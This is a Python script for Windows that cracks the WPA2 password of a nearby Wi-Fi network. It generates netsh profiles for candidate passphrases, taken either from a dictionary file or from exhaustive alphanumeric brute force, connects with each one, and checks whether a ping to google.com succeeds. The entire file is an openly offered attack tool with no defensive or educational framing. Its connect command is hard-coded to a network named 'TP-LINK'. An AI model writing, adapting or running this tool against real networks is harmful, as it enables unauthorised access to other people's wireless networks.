import os
from time import sleep
import subprocess
import itertools
from colorama import Fore
xml_content = """<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>%s</name>
    <SSIDConfig>
        <SSID>
            <name>%s</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>%s</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
    <MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
        <enableRandomization>false</enableRandomization>
    </MacRandomization>
</WLANProfile>"""
def write_config(name,ssid,password):
    with open('connect.xml','w+') as f:
        f.write(xml_content % (name,ssid,password))
def check_wifi(name):
    available_wifi = subprocess.getoutput('netsh wlan show networks')
    if name not in available_wifi:
            print('this wifi doesn\'t exist! ')
            exit()
def brute_force_with_dictionary():
    name = input('the name of wifi: ')
    check_wifi(name)
    ssid = name
    file_password = input('the name of pass_list: ')
    if os.path.isfile(file_password) == False:
        print('file doesn\'t exist!')
        exit(0)
    f = open(file_password)
    lines = f.readlines()
    for i in lines:
        password = i.strip()
        os.system('color a')
        write_config(name,ssid,password)
        os.system('netsh wlan add profile filename="connect.xml"')
        os.system('netsh wlan connect name="TP-LINK"')
        sleep(4)
        x = os.system('ping -n 1 google.com')
        sleep(2)
        if x == 0:
            os.system('cls')
            print(Fore.RED +  f'the password is {password}')
            os.system('color 7')
            exit(0)

def brute_force_all_things(password,name,ssid):
    os.system('color a')
    write_config(name,ssid,password)
    os.system('netsh wlan add profile filename="connect.xml"')
    os.system('netsh wlan connect name="TP-LINK"')
    sleep(4)
    x = os.system('ping -n 1 google.com')
    sleep(3)
    if x == 0:
        os.system('cls')
        print(f'the password is {password}')
        os.system('color 7')
        exit(0)
def generate_brute_force_list():
    characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    name = input('name of wifi: ')
    check_wifi(name)
    ssid = name
    length = int(input('length for passwords: '))
    for combination in itertools.product(characters, repeat=length):
        password = ''.join(combination)
        print(password)
        brute_force_all_things(password,name,ssid)
def choice():
    print(Fore.YELLOW + '1- dictionary attack\n2- brute force attack')
    choice = input('select -> ')
    if choice == '1':
        brute_force_with_dictionary()
    elif choice == '2':
        generate_brute_force_list()
    else:
        print('invalid choice!')
        exit()
choice()